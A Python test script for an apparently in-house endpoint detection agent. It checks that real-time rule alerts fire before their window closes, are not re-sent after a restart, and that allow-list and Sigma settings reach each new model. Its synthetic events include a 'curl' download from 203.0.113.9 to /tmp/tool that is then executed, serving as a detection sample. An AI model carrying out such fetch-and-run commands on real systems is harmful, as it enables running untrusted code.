"""Agent real-time rules: a rule alert is posted as soon as the events that trigger it are scored (before their
15-minute window closes), is not posted again with the window, and not again after a restart replays the open
window. Synthetic, harmless data (a program downloaded from an unknown address, then executed)."""
import os
import random
import sys
import tempfile
import time

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

from pdp_engine.bundle import sign_manifest
from pdp_engine.data import WindowStore, ingest_day
from pdp_engine.schema import Entity, Event, Registry
from pdp_engine.trainer import TrainConfig, Trainer
from pdp_agent.agent import Agent
from pdp_agent.config import Config

fails = 0


def check(ok, msg):
    global fails
    print(("PASS " if ok else "FAIL ") + msg)
    fails += 0 if ok else 1


class FakeTransport:
    def __init__(self):
        self.calls = []

    def post_ndjson(self, path, rows, batch_id=None):
        self.calls.append(("ndjson", path, rows, batch_id)); return {"ok": True}

    def request(self, method, path, body=None, **kw):
        self.calls.append((method, path, body)); return {"ok": True}


rng = random.Random(5)
MIN = 60 * 10**9
seq = [0]
progs = ["/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/sshd"]
files = [f"/etc/conf{i}" for i in range(8)]


def activity(t0, minutes, tag, special_at=None):
    out = []

    def ev(ts, a, op, b):
        seq[0] += 1
        out.append(([a, b], Event(ts, a.uuid, op, b.uuid, f"e{seq[0]:010d}")))
    for m in range(minutes):
        for k in range(12):
            ts = t0 + m * MIN + k * 10**9
            exe = rng.choice(progs)
            p = Entity.process(f"p:{tag}:{m}:{k}", exe, f"{exe} {k % 3}")
            ev(ts, Entity.file(f"file:{exe}", exe), "EXECUTE", p)
            f = rng.choice(files)
            ev(ts, Entity.file(f"file:{f}", f), "READ", p)
        if m == special_at:
            ts = t0 + m * MIN + 30 * 10**9
            c = Entity.process(f"p:{tag}:dl", "/usr/bin/curl", "curl -o /tmp/tool http://203.0.113.9/tool")
            net = Entity.socket("net:203.0.113.9:80", "203.0.113.9", 80)
            tool = Entity.file("file:/tmp/tool", "/tmp/tool")
            ev(ts, net, "RECVFROM", c)
            ev(ts + 10**9, c, "WRITE", tool)
            ev(ts + 2 * 10**9, tool, "EXECUTE", Entity.process(f"p:{tag}:run", "/tmp/tool", "/tmp/tool"))
    return out


now = time.time_ns()
WIN = 15 * MIN
tmp = tempfile.mkdtemp()
base = activity(now - 8 * 60 * MIN, 150, "base")
store = WindowStore(os.path.join(tmp, "store"))
reg = Registry()
for ents, _ in base:
    for e in ents:
        reg.add(e)
cut = len(base) * 2 // 3
store.add_day("d1", ingest_day(reg, (ev for _, ev in base[:cut]), None, window_ns=WIN))
store.add_day("d2", ingest_day(reg, (ev for _, ev in base[cut:]), None, window_ns=WIN))
store.save_registry(reg)
data = os.path.join(tmp, "data")
bdir = os.path.join(data, "bundles", "b1", "bundle")
os.makedirs(bdir)
cfg_t = TrainConfig(device="cpu", w2v_epochs=2, emb_dim=16, velox_epochs=1, velox_runs=1, orthrus_seeds=(0,), orthrus_epochs=1,
                    orthrus_hid_dim=16, orthrus_out_dim=16, velox_out_dim=16, neighbor_size=5)
Trainer(store, ["d1"], "d2", cfg_t, bdir).run({"bundle_id": "b1", "window_ns": WIN})
key = ed25519.Ed25519PrivateKey.generate()
sign_manifest(bdir, key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
os.makedirs(os.path.join(data, "pki"))
open(os.path.join(data, "pki", "bundle_signing.pub"), "wb").write(key.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
cfg = Config(data_dir=data, pki_dir=os.path.join(data, "pki"), source={"kind": "ebpf"}, day_tz="UTC")


def new_agent():
    a = Agent(cfg)
    a.state.set("endpoint_id", "e1"); a.state.set("config", {"baseline_days": 1, "tz": "UTC"})
    a.eid, a.tr = "e1", FakeTransport()
    return a


def posted(a, kind):
    return [r for c in a.tr.calls if c[0] == "ndjson" and c[1].endswith("/" + kind) for r in c[2]]


a = new_agent()
a.ingest(base)
a._load_bundle("b1", bdir)
a.state.c.execute("UPDATE events SET scored=1")
live = activity(now - 40 * MIN, 12, "live", special_at=5)     # the download happens ~5.5 minutes in
run_i = next(i for i, (_, ev) in enumerate(live) if ev.dst == "p:live:run")
for i in range(0, run_i + 1, 30):                             # the agent's loop: small batches, scored as they come
    a.ingest(live[i:i + 30])
    a.score_backlog()
a.ingest(live[run_i + 1: run_i + 2]); a.score_backlog()
alerts = posted(a, "alerts")
wins = posted(a, "windows")
tool = [x for x in alerts if x["node"]["uuid"] in ("file:/tmp/tool", "p:live:run")]
check(tool and not wins, f"the downloaded program's execution is alerted before its window closes ({[(x['node']['uuid'], x['rule']) for x in tool]})")
check(all(x["fused"] == 0.0 and x["layer"] in ("rules", "novelty") and x["rule"] and x["reason"] and x["context"]["edges"] for x in tool), "real-time alerts carry their rule, reason and event context")
n_alerts = len(alerts)

# restart before the window closes: the open window is replayed; the alert is not sent again
del a
b = new_agent()
b._load_bundle("b1", bdir)
b.ingest(live[run_i + 2:])
b.score_backlog()
b.flush_window()
alerts_b = posted(b, "alerts")
wins_b = posted(b, "windows")
dup = [x for x in alerts_b if x["node"]["uuid"] in ("file:/tmp/tool", "p:live:run") and x["layer"] in ("rules", "novelty")]
check(wins_b and not dup, f"after a restart the replayed window is scored ({len(wins_b)} windows) without sending the rule alert again")
check(sum(w["alerts"] for w in wins_b) >= len(tool), "the window summary still counts the real-time alerts")

# 0.10: console-side layer settings reach every newly loaded model (they used to stay on the previous runtime)
c = new_agent()
c.state.set("config", {"baseline_days": 1, "tz": "UTC", "suppressed_detections": [["novel_executable", "/usr/bin/curl"]],
                       "trusted_addresses": ["203.0.113.0/24"], "fleet_prevalence": "evidence", "fleet_programs": {"/usr/bin/wget": 3}})
c._apply_layer_config(c.state.get("config"))          # no model yet: nothing to apply
c._load_bundle("b1", bdir)
r1 = c.runtime
c._load_bundle("b1", bdir)                            # a model upgrade: new runtime
ok = lambda r: (r.layers.suppressed == {("novel_executable", "/usr/bin/curl")} and r.layers.novelty.fleet == {"/usr/bin/wget": 3}  # noqa: E731
                and r.layers.novelty.fleet_mode == "evidence")
check(r1 is not c.runtime and ok(r1) and ok(c.runtime), "allow list and fleet programs are applied to the first and to every new model")
# 0.12: the Sigma setting (off by default) reaches the model, and every new one
check(c.runtime.layers.sigma is None, "Sigma rules off by default")
c.state.set("config", dict(c.state.get("config"), sigma="high")); c._apply_layer_config(c.state.get("config"))
check(c.runtime.layers.sigma is not None and c.runtime.layers.sigma.levels == ("high", "critical"), "sigma=high turns the layer on")
c._load_bundle("b1", bdir)
check(c.runtime.layers.sigma is not None, "and stays on for a newly loaded model")
c.state.set("config", dict(c.state.get("config"), sigma="off")); c._apply_layer_config(c.state.get("config"))
check(c.runtime.layers.sigma is None, "sigma=off turns it off again")

print("FAILURES:", fails)
sys.exit(1 if fails else 0)
